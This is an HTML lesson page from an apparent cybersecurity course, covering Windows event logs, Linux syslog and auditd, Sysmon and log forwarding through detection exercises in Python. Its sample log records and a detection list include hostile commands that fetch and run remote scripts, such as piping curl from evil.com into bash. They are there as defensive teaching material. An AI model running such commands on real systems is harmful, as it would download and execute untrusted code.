@@ -1,0 +1,784 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Week 08 — Log Sources &amp; Collection</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script></head>
+<body data-site="cyber">
+<header class="top"><div class="in">
+<a class="brand" href="index.html">Cyber Track</a>
+<a href="index.html">Weeks</a><a href="play.html">Playground</a><a href="../index.html">All sites</a>
+<span class="sp"></span><span class="prog" id="prog"></span>
+</div></header>
+<main>
+<h1>Week 08 — Log Sources &amp; Collection</h1><div class="toc"><a class="btn ghost" href="#day-1">Day 1</a><a class="btn ghost" href="#day-2">Day 2</a><a class="btn ghost" href="#day-3">Day 3</a><a class="btn ghost" href="#day-4">Day 4</a><a class="btn ghost" href="#day-5">Day 5</a></div><p class="note">Done this week: <span data-week-count="08" data-size="5"></span></p><p class="note">Code blocks run in your browser. <button class="ghost" id="resetpy" type="button">Reset Python session</button></p><h1>Week 08 — Log Sources &amp; Collection</h1>
+<h2>Metadata</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phase</td>
+<td>Phase 3 — Log Analysis &amp; SIEM</td>
+</tr>
+<tr>
+<td>Cert Alignment</td>
+<td>BTL1: Log analysis, event sources / SC-200: Data connectors / GCIA: Log normalization</td>
+</tr>
+<tr>
+<td>Royal Road</td>
+<td>Sysmon → normalized Parquet detection dataset</td>
+</tr>
+<tr>
+<td>Prerequisites</td>
+<td>W01 (networking), W03 (Linux), W05 (ATT&amp;CK), W07 (CTI)</td>
+</tr>
+<tr>
+<td>Est. Hours</td>
+<td>8–10 hrs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="day-1">Day 1 — Windows Event Logging</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="08-1"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=05jnDuRceLg" target="_blank" rel="noopener"><b>The Event Viewer, Explained</b><small>Ask Leo!</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Windows%20event%20log%20analysis%20security%20monitoring%20EVTX" target="_blank" rel="noopener">Windows event log analysis security monitoring EVTX</a></p></div>
+<hr />
+<h3>Concept 1 — Windows Event Log Architecture</h3>
+<p>Windows logs everything through the Event Tracing for Windows (ETW) subsystem. Every security-relevant action — logon, process creation, object access — produces a structured XML record written to a <code>.evtx</code> file under <code>C:\Windows\System32\winevt\Logs\</code>.</p>
+<p>Three channels matter most for detection:</p>
+<ul>
+<li><strong>Security</strong> — authentication events, privilege use, object access</li>
+<li><strong>System</strong> — service starts/stops, driver loads</li>
+<li><strong>Application</strong> — application-level errors and warnings</li>
+</ul>
+<p>Each event has an <strong>Event ID</strong> (the action code) and a <strong>Provider</strong> (who generated it). The Security channel's provider is <code>Microsoft-Windows-Security-Auditing</code>. Think of Event IDs as HTTP status codes — once you know the map, you can triage quickly.</p>
+<p>Data engineering analogy: ETW is a streaming producer (Kafka), <code>.evtx</code> files are append-only topic partitions, and your SIEM is the consumer pulling offsets.</p>
+<p><strong>Example:</strong></p>
+<pre><code>&lt;!-- Event ID 4624 — Successful Logon (Security channel) --&gt;
+&lt;Event&gt;
+  &lt;System&gt;
+    &lt;Provider Name=&quot;Microsoft-Windows-Security-Auditing&quot;/&gt;
+    &lt;EventID&gt;4624&lt;/EventID&gt;
+    &lt;TimeCreated SystemTime=&quot;2024-03-15T08:23:41Z&quot;/&gt;
+    &lt;Computer&gt;WORKSTATION-01&lt;/Computer&gt;
+  &lt;/System&gt;
+  &lt;EventData&gt;
+    &lt;Data Name=&quot;SubjectUserName&quot;&gt;-&lt;/Data&gt;
+    &lt;Data Name=&quot;TargetUserName&quot;&gt;jsmith&lt;/Data&gt;
+    &lt;Data Name=&quot;TargetDomainName&quot;&gt;CORP&lt;/Data&gt;
+    &lt;Data Name=&quot;LogonType&quot;&gt;3&lt;/Data&gt;
+    &lt;Data Name=&quot;IpAddress&quot;&gt;192.168.1.50&lt;/Data&gt;
+    &lt;Data Name=&quot;AuthenticationPackageName&quot;&gt;Kerberos&lt;/Data&gt;
+  &lt;/EventData&gt;
+&lt;/Event&gt;
+</code></pre><p><strong>Exercise:</strong>
+Parse the event above manually. List: who logged on, from where, using what protocol, and what LogonType 3 means (network logon — not interactive).
+Expected output: structured dict with keys: user, source_ip, logon_type_name, auth_package</p>
+<hr />
+<h3>Concept 2 — Critical Security Event IDs</h3>
+<p>A focused set of Event IDs covers 80% of detection use cases. Memorizing these is the equivalent of knowing SQL aggregate functions — the primitives everything else builds on.</p>
+<table>
+<thead>
+<tr>
+<th>Category</th>
+<th>Event ID</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Logon</td>
+<td>4624</td>
+<td>Successful logon</td>
+</tr>
+<tr>
+<td>Logon</td>
+<td>4625</td>
+<td>Failed logon</td>
+</tr>
+<tr>
+<td>Logon</td>
+<td>4648</td>
+<td>Logon with explicit credentials (runas)</td>
+</tr>
+<tr>
+<td>Account</td>
+<td>4720</td>
+<td>User account created</td>
+</tr>
+<tr>
+<td>Account</td>
+<td>4728</td>
+<td>User added to security group</td>
+</tr>
+<tr>
+<td>Process</td>
+<td>4688</td>
+<td>Process created (requires audit policy)</td>
+</tr>
+<tr>
+<td>Object</td>
+<td>4663</td>
+<td>Object access attempted</td>
+</tr>
+<tr>
+<td>Policy</td>
+<td>4719</td>
+<td>Audit policy changed</td>
+</tr>
+<tr>
+<td>Logoff</td>
+<td>4634</td>
+<td>Logoff</td>
+</tr>
+</tbody>
+</table>
+<p>Sysmon (covered Day 3) supplements these with richer process and network data that the native Security channel lacks.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Map of high-priority Event IDs for a detection pipeline
+CRITICAL_EVENT_IDS = {
+    4624: &quot;logon_success&quot;,
+    4625: &quot;logon_failure&quot;,
+    4648: &quot;explicit_credentials&quot;,
+    4688: &quot;process_create&quot;,
+    4720: &quot;account_created&quot;,
+    4728: &quot;group_member_added&quot;,
+    4719: &quot;audit_policy_changed&quot;,
+}
+
+def classify_event(event_id: int) -&gt; str:
+    return CRITICAL_EVENT_IDS.get(event_id, &quot;other&quot;)
+
+print(classify_event(4625))   # logon_failure
+print(classify_event(7045))   # other
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write a function <code>triage_events(records: list[dict]) -&gt; dict</code> that takes a list of <code>{&quot;event_id&quot;: int, &quot;timestamp&quot;: str, &quot;user&quot;: str}</code> records and returns counts grouped by classification from <code>CRITICAL_EVENT_IDS</code>. Records with unknown IDs go under &quot;other&quot;.
+Expected output: <code>{&quot;logon_success&quot;: 3, &quot;logon_failure&quot;: 7, &quot;other&quot;: 2}</code></p>
+<hr />
+<h3>Concept 3 — LogonType Values and Lateral Movement</h3>
+<p>LogonType is the most underused field in 4624/4625 events. It tells you <em>how</em> someone authenticated — physically at a keyboard, over the network, as a service, or as a batch job. Attackers who move laterally almost always appear as LogonType 3 (network) or 10 (remote interactive via RDP).</p>
+<table>
+<thead>
+<tr>
+<th>LogonType</th>
+<th>Name</th>
+<th>Attacker Use</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>Interactive</td>
+<td>Console access, physical</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network</td>
+<td>Pass-the-hash, PsExec, SMB</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Batch</td>
+<td>Scheduled tasks</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Service</td>
+<td>Malicious service install</td>
+</tr>
+<tr>
+<td>10</td>
+<td>RemoteInteractive</td>
+<td>RDP session</td>
+</tr>
+<tr>
+<td>11</td>
+<td>CachedInteractive</td>
+<td>Offline cached creds</td>
+</tr>
+</tbody>
+</table>
+<p>A detection rule that fires on LogonType 3 from a workstation <em>to</em> another workstation (peer-to-peer) catches most lateral movement scenarios.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>def is_lateral_movement_candidate(event: dict) -&gt; bool:
+    &quot;&quot;&quot;Flag network logons between two non-DC workstations.&quot;&quot;&quot;
+    lateral_types = {3, 10}
+    source = event.get(&quot;source_host&quot;, &quot;&quot;)
+    target = event.get(&quot;target_host&quot;, &quot;&quot;)
+    logon_type = event.get(&quot;logon_type&quot;, 0)
+
+    is_workstation_to_workstation = (
+        not source.startswith(&quot;DC&quot;) and
+        not target.startswith(&quot;DC&quot;) and
+        source != target
+    )
+    return logon_type in lateral_types and is_workstation_to_workstation
+
+event = {&quot;source_host&quot;: &quot;WS-01&quot;, &quot;target_host&quot;: &quot;WS-07&quot;, &quot;logon_type&quot;: 3, &quot;user&quot;: &quot;jsmith&quot;}
+print(is_lateral_movement_candidate(event))  # True
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Given a list of logon events, write a function <code>find_lateral_candidates(events: list[dict]) -&gt; list[dict]</code> that returns only events matching lateral movement criteria from the function above, sorted by timestamp ascending.
+Expected output: list of dicts, each with keys: source_host, target_host, logon_type, user, timestamp</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can parse and explain raw EVTX XML without schema documentation.
+<strong>Threat:</strong> Attackers use LLMs to generate realistic-looking logon event sequences that blend with normal traffic.
+<strong>Opportunity:</strong> Feed a cluster of 4625 events to an LLM to get a plain-English summary: &quot;7 failed logons for user admin from 10.0.0.5 within 30 seconds — likely brute force.&quot;
+<strong>Prompt to try:</strong> <code>&quot;Given these Windows Security event records (JSON), identify which user accounts show signs of brute-force or credential stuffing. Explain your reasoning and suggest the minimal KQL query to detect this pattern.&quot;</code></p>
+<hr />
+<h2 id="day-2">Day 2 — Linux Log Sources</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="08-2"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=SFdcbdhOs90" target="_blank" rel="noopener"><b>Understanding Linux Logging: Var Log, Journal, and Logger</b><small>Red Hat Enterprise Linux</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Linux%20syslog%20auditd%20security%20monitoring%20log%20analysis" target="_blank" rel="noopener">Linux syslog auditd security monitoring log analysis</a></p></div>
+<hr />
+<h3>Concept 1 — Linux Logging Subsystems</h3>
+<p>Linux has two parallel logging subsystems that serve different purposes:</p>
+<p><strong>syslog / journald</strong> — system and application messages. Written to <code>/var/log/syslog</code> (Debian) or <code>/var/log/messages</code> (RHEL). Format: <code>timestamp hostname process[pid]: message</code>. Great for service crashes, sudo usage, SSH connections.</p>
+<p><strong>auditd</strong> — kernel-level syscall auditing. Written to <code>/var/log/audit/audit.log</code>. Format uses key=value pairs. Can log every <code>execve()</code>, file open, network connect, and user action at the kernel level. Much more tamper-resistant than syslog.</p>
+<p>Data engineering analogy: syslog is an application log (like your ETL pipeline print statements). auditd is database write-ahead logging — low-level, structured, and authoritative.</p>
+<p><strong>Example:</strong></p>
+<pre><code># syslog SSH entry
+Mar 15 08:23:41 server01 sshd[1234]: Accepted publickey for deploy from 10.0.1.20 port 52341
+
+# auditd execve entry (parsed)
+# type=EXECVE msg=audit(1710490221.445:889): argc=3 a0=&quot;bash&quot; a1=&quot;-c&quot; a2=&quot;curl http://evil.com/shell.sh | bash&quot;
+
+# Parse auditd key=value format
+import re
+
+def parse_auditd_line(line: str) -&gt; dict:
+    return dict(re.findall(r&#x27;(\w+)=&quot;?([^&quot;\s]+)&quot;?&#x27;, line))
+
+line = &#x27;type=EXECVE msg=audit(1710490221:889): argc=3 a0=&quot;bash&quot; a1=&quot;-c&quot; a2=&quot;id&quot;&#x27;
+parsed = parse_auditd_line(line)
+print(parsed)
+</code></pre><p><strong>Exercise:</strong>
+Write <code>extract_ssh_events(log_lines: list[str]) -&gt; list[dict]</code> that parses syslog lines, returning dicts with keys: timestamp, host, user, source_ip for lines containing &quot;Accepted&quot; or &quot;Failed&quot; SSH auth. Use regex.
+Expected output: list of dicts with parsed fields; lines not matching SSH auth are ignored</p>
+<hr />
+<h3>Concept 2 — /var/log Key Files</h3>
+<p>Linux security monitoring depends on knowing which log file captures which event type. An analyst who doesn't know the log map wastes time grepping the wrong file.</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Events</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/var/log/auth.log</code></td>
+<td>SSH, sudo, su, PAM</td>
+</tr>
+<tr>
+<td><code>/var/log/syslog</code></td>
+<td>General system events</td>
+</tr>
+<tr>
+<td><code>/var/log/audit/audit.log</code></td>
+<td>Kernel syscalls, auditd rules</td>
+</tr>
+<tr>
+<td><code>/var/log/secure</code></td>
+<td>RHEL equivalent of auth.log</td>
+</tr>
+<tr>
+<td><code>/var/log/wtmp</code> / <code>last</code></td>
+<td>Login history</td>
+</tr>
+<tr>
+<td><code>/var/log/btmp</code> / <code>lastb</code></td>
+<td>Failed login history</td>
+</tr>
+<tr>
+<td><code>/proc/[pid]/cmdline</code></td>
+<td>Running process command lines</td>
+</tr>
+<tr>
+<td><code>~/.bash_history</code></td>
+<td>User command history (tamperable)</td>
+</tr>
+</tbody>
+</table>
+<p><code>/var/log/wtmp</code> and <code>/var/log/btmp</code> are binary files — read with <code>last</code> and <code>lastb</code> commands, not <code>cat</code>.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import subprocess
+
+def get_recent_ssh_logins(n: int = 10) -&gt; list[str]:
+    &quot;&quot;&quot;Read SSH login history via &#x27;last&#x27; command.&quot;&quot;&quot;
+    result = subprocess.run(
+        [&quot;last&quot;, &quot;-n&quot;, str(n), &quot;-F&quot;],
+        capture_output=True, text=True
+    )
+    lines = [l for l in result.stdout.splitlines() if l.strip() and &quot;reboot&quot; not in l]
+    return lines
+
+# Simulated output for exercise
+SIMULATED_LAST = [
+    &quot;jsmith   pts/0  10.0.1.5  Thu Mar 14 09:15:22 2024 - Thu Mar 14 09:47:01 2024&quot;,
+    &quot;root     pts/1  10.0.0.1  Thu Mar 14 03:00:01 2024 - Thu Mar 14 03:02:55 2024&quot;,
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>parse_last_output(lines: list[str]) -&gt; list[dict]</code> that parses lines from <code>SIMULATED_LAST</code> above into dicts with keys: user, terminal, source_ip, login_time. Flag any root logins by adding <code>&quot;suspicious&quot;: True</code> to those records.
+Expected output: list of 2 dicts; root entry has <code>suspicious: True</code></p>
+<hr />
+<h3>Concept 3 — auditd Rules and EXECVE Logging</h3>
+<p>auditd is only useful if rules are configured. A default install logs almost nothing. Detection engineers add rules to capture the events that matter.</p>
+<p>Rules follow the pattern: <code>auditctl -a always,exit -F arch=b64 -S execve -k exec_log</code></p>
+<p>Key rule fields:</p>
+<ul>
+<li><code>-a always,exit</code> — log on syscall exit</li>
+<li><code>-F arch=b64</code> — 64-bit processes</li>
+<li><code>-S execve</code> — the execve syscall (every process launch)</li>
+<li><code>-k exec_log</code> — tag for filtering in audit.log</li>
+</ul>
+<p>The <code>ausearch</code> command searches audit.log by key, time, or user. <code>aureport</code> generates summaries.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Simulate parsing auditd EXECVE records for suspicious commands
+SUSPICIOUS_COMMANDS = [&quot;curl&quot;, &quot;wget&quot;, &quot;nc&quot;, &quot;ncat&quot;, &quot;bash -i&quot;, &quot;python -c&quot;, &quot;perl -e&quot;]
+
+def flag_suspicious_execve(records: list[dict]) -&gt; list[dict]:
+    &quot;&quot;&quot;Flag records where command matches known suspicious patterns.&quot;&quot;&quot;
+    flagged = []
+    for rec in records:
+        cmd = rec.get(&quot;command&quot;, &quot;&quot;)
+        if any(s in cmd for s in SUSPICIOUS_COMMANDS):
+            flagged.append({**rec, &quot;flag&quot;: &quot;suspicious_execve&quot;})
+    return flagged
+
+records = [
+    {&quot;pid&quot;: &quot;1234&quot;, &quot;uid&quot;: &quot;1001&quot;, &quot;command&quot;: &quot;curl http://10.0.0.1/shell.sh&quot;},
+    {&quot;pid&quot;: &quot;1235&quot;, &quot;uid&quot;: &quot;0&quot;,    &quot;command&quot;: &quot;ls -la /etc&quot;},
+    {&quot;pid&quot;: &quot;1236&quot;, &quot;uid&quot;: &quot;1001&quot;, &quot;command&quot;: &quot;wget -O /tmp/x http://evil.com/x&quot;},
+]
+print(flag_suspicious_execve(records))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Extend <code>flag_suspicious_execve</code> to also flag any command run by uid <code>&quot;0&quot;</code> (root) that launches a network tool (curl, wget, nc). Return a summary dict: <code>{&quot;total&quot;: N, &quot;flagged&quot;: M, &quot;flagged_records&quot;: [...]}</code>.
+Expected output: <code>{&quot;total&quot;: 3, &quot;flagged&quot;: 2, &quot;flagged_records&quot;: [...]}</code></p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can correlate auditd EXECVE chains to explain multi-step attack sequences.
+<strong>Threat:</strong> An attacker who compromises a host deletes <code>.bash_history</code> and clears syslog — but auditd records survive if logs are forwarded off-host.
+<strong>Opportunity:</strong> Feed a 30-line auditd excerpt to an LLM: &quot;Summarize what this user did and whether any actions look like privilege escalation or data exfiltration.&quot;
+<strong>Prompt to try:</strong> <code>&quot;Here are 20 auditd EXECVE records from a Linux server (JSON). Build a timeline of what the user did. Identify any privilege escalation attempts, credential access, or network callback patterns. Map each finding to a MITRE ATT&amp;CK technique.&quot;</code></p>
+<hr />
+<h2 id="day-3">Day 3 — Sysmon: The Detection Engineer's Best Friend</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="08-3"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=98B9UmFr0qs" target="_blank" rel="noopener"><b>Sysmon: How to Install And Set Up Sysmon</b><small>Lame Creations</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=Sysmon%20install%20configuration%20detection%20engineering%20SwiftOnSecurity" target="_blank" rel="noopener">Sysmon install configuration detection engineering SwiftOnSecurity</a></p></div>
+<hr />
+<h3>Concept 1 — What Sysmon Is and Why It Matters</h3>
+<p>System Monitor (Sysmon) is a free Windows Sysinternals tool that installs as a kernel driver and service. It generates extremely rich event logs that the native Security channel cannot produce — including process GUIDs, full command lines, parent-child process relationships, network connection details, DNS queries, and file hashes.</p>
+<p>Sysmon events land in <code>Microsoft-Windows-Sysmon/Operational</code> and are readable via Event Viewer or forwarded to a SIEM. They're structured XML, like Security events, but with far more fields per record.</p>
+<p>Key Sysmon Event IDs:</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Event</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>Process Create</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Network Connect</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Image Load (DLL)</td>
+</tr>
+<tr>
+<td>8</td>
+<td>CreateRemoteThread</td>
+</tr>
+<tr>
+<td>10</td>
+<td>ProcessAccess (memory injection)</td>
+</tr>
+<tr>
+<td>11</td>
+<td>File Create</td>
+</tr>
+<tr>
+<td>12/13</td>
+<td>Registry events</td>
+</tr>
+<tr>
+<td>15</td>
+<td>FileCreateStreamHash (ADS)</td>
+</tr>
+<tr>
+<td>22</td>
+<td>DNS Query</td>
+</tr>
+</tbody>
+</table>
+<p>Data engineering analogy: Sysmon is like enabling query logging on a database — the database worked before, but now you can audit every operation.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Sysmon Event ID 1 (ProcessCreate) — key fields
+sysmon_event_1 = {
+    &quot;EventID&quot;: 1,
+    &quot;UtcTime&quot;: &quot;2024-03-15 08:23:41.445&quot;,
+    &quot;ProcessGuid&quot;: &quot;{4a21d926-8f17-65f4-a301-000000000b00}&quot;,
+    &quot;ProcessId&quot;: &quot;4512&quot;,
+    &quot;Image&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;,
+    &quot;CommandLine&quot;: &quot;cmd.exe /c whoami &amp;&amp; net user&quot;,
+    &quot;ParentProcessGuid&quot;: &quot;{4a21d926-8f10-65f4-9f01-000000000b00}&quot;,
+    &quot;ParentImage&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;,
+    &quot;ParentCommandLine&quot;: &quot;powershell.exe -EncodedCommand &lt;base64&gt;&quot;,
+    &quot;Hashes&quot;: &quot;SHA256=A4B7C2...&quot;,
+    &quot;User&quot;: &quot;CORP\\jsmith&quot;,
+    &quot;IntegrityLevel&quot;: &quot;High&quot;
+}
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>extract_process_chain(events: list[dict]) -&gt; list[dict]</code> that filters Sysmon EventID=1 records and returns them with only fields: timestamp, image, command_line, parent_image, user. Sort by timestamp.
+Expected output: list of dicts with 5 keys each; only EventID=1 records included</p>
+<hr />
+<h3>Concept 2 — Sysmon Configuration and Filtering</h3>
+<p>A default Sysmon install with no config logs <em>everything</em>, producing enormous noise. The SwiftOnSecurity sysmon-config (widely used in the community) uses an exclude-based approach: log everything except known-safe processes.</p>
+<p>Config is XML. Key structure:</p>
+<pre><code>&lt;Sysmon schemaversion=&quot;4.90&quot;&gt;
+  &lt;EventFiltering&gt;
+    &lt;ProcessCreate onmatch=&quot;exclude&quot;&gt;
+      &lt;!-- exclude noisy but safe processes --&gt;
+      &lt;Image condition=&quot;is&quot;&gt;C:\Windows\System32\svchost.exe&lt;/Image&gt;
+    &lt;/ProcessCreate&gt;
+    &lt;NetworkConnect onmatch=&quot;exclude&quot;&gt;
+      &lt;Image condition=&quot;is&quot;&gt;C:\Windows\System32\svchost.exe&lt;/Image&gt;
+    &lt;/NetworkConnect&gt;
+  &lt;/EventFiltering&gt;
+&lt;/Sysmon&gt;
+</code></pre><p><code>onmatch=&quot;exclude&quot;</code> means: log everything <em>except</em> these. <code>onmatch=&quot;include&quot;</code> means: log <em>only</em> these.</p>
+<p>For detection engineering, the include model is used in honeypot/canary environments; the exclude model is used for production endpoint coverage.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Simulate the effect of exclude-based filtering
+EXCLUDED_IMAGES = {
+    &quot;C:\\Windows\\System32\\svchost.exe&quot;,
+    &quot;C:\\Windows\\System32\\services.exe&quot;,
+    &quot;C:\\Windows\\explorer.exe&quot;,
+}
+
+def apply_sysmon_filter(events: list[dict], excluded: set[str]) -&gt; list[dict]:
+    return [e for e in events if e.get(&quot;Image&quot;) not in excluded]
+
+events = [
+    {&quot;EventID&quot;: 1, &quot;Image&quot;: &quot;C:\\Windows\\System32\\svchost.exe&quot;, &quot;CommandLine&quot;: &quot;svchost -k netsvcs&quot;},
+    {&quot;EventID&quot;: 1, &quot;Image&quot;: &quot;C:\\Windows\\System32\\cmd.exe&quot;, &quot;CommandLine&quot;: &quot;cmd /c whoami&quot;},
+    {&quot;EventID&quot;: 1, &quot;Image&quot;: &quot;C:\\Temp\\evil.exe&quot;, &quot;CommandLine&quot;: &quot;evil.exe -install&quot;},
+]
+filtered = apply_sysmon_filter(events, EXCLUDED_IMAGES)
+print(len(filtered))  # 2
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>sysmon_volume_report(events: list[dict]) -&gt; dict</code> that returns a count of events per Image path, sorted descending. Then identify which images would be good exclude candidates (count &gt; 50% of total events). Return <code>{&quot;counts&quot;: {...}, &quot;exclude_candidates&quot;: [...]}</code>.
+Expected output: dict with sorted counts and a list of high-volume image paths</p>
+<hr />
+<h3>Concept 3 — Sysmon Network and DNS Events</h3>
+<p>Sysmon EventID 3 (NetworkConnect) and EventID 22 (DNS Query) are essential for detecting C2 beaconing and data exfiltration. These events include source/destination IP, port, process that made the connection, and DNS query name — data that Windows Firewall logs omit.</p>
+<p>A process making outbound connections to random-looking domains every 60 seconds is a C2 beacon. Sysmon EventID 22 captures the DNS query, and EventID 3 captures the TCP/UDP connection — correlating both gives you the full picture.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import collections
+
+def detect_dns_beaconing(dns_events: list[dict], threshold_count: int = 5) -&gt; list[dict]:
+    &quot;&quot;&quot;
+    Flag processes making repeated DNS queries to the same domain.
+    Returns candidates sorted by query count descending.
+    &quot;&quot;&quot;
+    counter: dict[tuple, int] = collections.Counter()
+    for e in dns_events:
+        key = (e[&quot;Image&quot;], e[&quot;QueryName&quot;])
+        counter[key] += 1
+
+    candidates = [
+        {&quot;image&quot;: k[0], &quot;domain&quot;: k[1], &quot;query_count&quot;: v}
+        for k, v in counter.items()
+        if v &gt;= threshold_count
+    ]
+    return sorted(candidates, key=lambda x: x[&quot;query_count&quot;], reverse=True)
+
+dns_events = [
+    {&quot;EventID&quot;: 22, &quot;Image&quot;: &quot;C:\\Temp\\beacon.exe&quot;, &quot;QueryName&quot;: &quot;c2.evil.com&quot;},
+    {&quot;EventID&quot;: 22, &quot;Image&quot;: &quot;C:\\Temp\\beacon.exe&quot;, &quot;QueryName&quot;: &quot;c2.evil.com&quot;},
+    {&quot;EventID&quot;: 22, &quot;Image&quot;: &quot;C:\\Temp\\beacon.exe&quot;, &quot;QueryName&quot;: &quot;c2.evil.com&quot;},
+    {&quot;EventID&quot;: 22, &quot;Image&quot;: &quot;C:\\Temp\\beacon.exe&quot;, &quot;QueryName&quot;: &quot;c2.evil.com&quot;},
+    {&quot;EventID&quot;: 22, &quot;Image&quot;: &quot;C:\\Temp\\beacon.exe&quot;, &quot;QueryName&quot;: &quot;c2.evil.com&quot;},
+    {&quot;EventID&quot;: 22, &quot;Image&quot;: &quot;C:\\Windows\\chrome.exe&quot;, &quot;QueryName&quot;: &quot;google.com&quot;},
+]
+print(detect_dns_beaconing(dns_events))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>correlate_dns_network(dns_events: list[dict], net_events: list[dict]) -&gt; list[dict]</code> that matches EventID 22 and EventID 3 records by Image and groups them into <code>{&quot;image&quot;: ..., &quot;domains&quot;: [...], &quot;dest_ips&quot;: [...], &quot;event_count&quot;: N}</code>. Return one entry per unique Image.
+Expected output: list of dicts, one per process, with correlated DNS + network activity</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can generate Sysmon XML configuration rules from a plain-English threat description.
+<strong>Threat:</strong> Attackers know common Sysmon configs and deliberately use signed LOLBins (living-off-the-land binaries) that appear in the exclude list.
+<strong>Opportunity:</strong> Ask an LLM to review a Sysmon config and identify gaps — &quot;which MITRE techniques would not be detected by this configuration?&quot;
+<strong>Prompt to try:</strong> <code>&quot;Here is a Sysmon XML config. List the MITRE ATT&amp;CK techniques that this config would fail to detect, and suggest the specific EventFiltering rules needed to close each gap.&quot;</code></p>
+<hr />
+<h2 id="day-4">Day 4 — Log Forwarding and Normalization</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="08-4"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=grloDtOS21c" target="_blank" rel="noopener"><b>ELK Stack - Windows Event Logs Analysis using Winlogbeat</b><small>DevopsGuru</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=log%20forwarding%20normalization%20SIEM%20pipeline%20Winlogbeat%20Fluentd" target="_blank" rel="noopener">log forwarding normalization SIEM pipeline Winlogbeat Fluentd</a></p></div>
+<hr />
+<h3>Concept 1 — Log Forwarding Architecture</h3>
+<p>Raw logs sitting on a single endpoint are useless for detection at scale. A log forwarding pipeline collects events from hundreds or thousands of endpoints and centralizes them. The standard architecture:</p>
+<pre><code>Endpoint (Windows/Linux)
+    → Agent (Winlogbeat / NXLog / Fluentd)
+        → Transport (TLS, over port 5044/5514)
+            → Aggregator (Logstash / Vector)
+                → Storage (Elasticsearch / Splunk / Sentinel)
+</code></pre><p>Key agents:</p>
+<ul>
+<li><strong>Winlogbeat</strong> — reads Windows Event Log, forwards to Elasticsearch</li>
+<li><strong>Fluentd / Fluent Bit</strong> — lightweight, works on Linux and Windows</li>
+<li><strong>NXLog</strong> — used in enterprise Windows environments</li>
+<li><strong>Azure Monitor Agent</strong> — forwards to Log Analytics Workspace (Sentinel)</li>
+</ul>
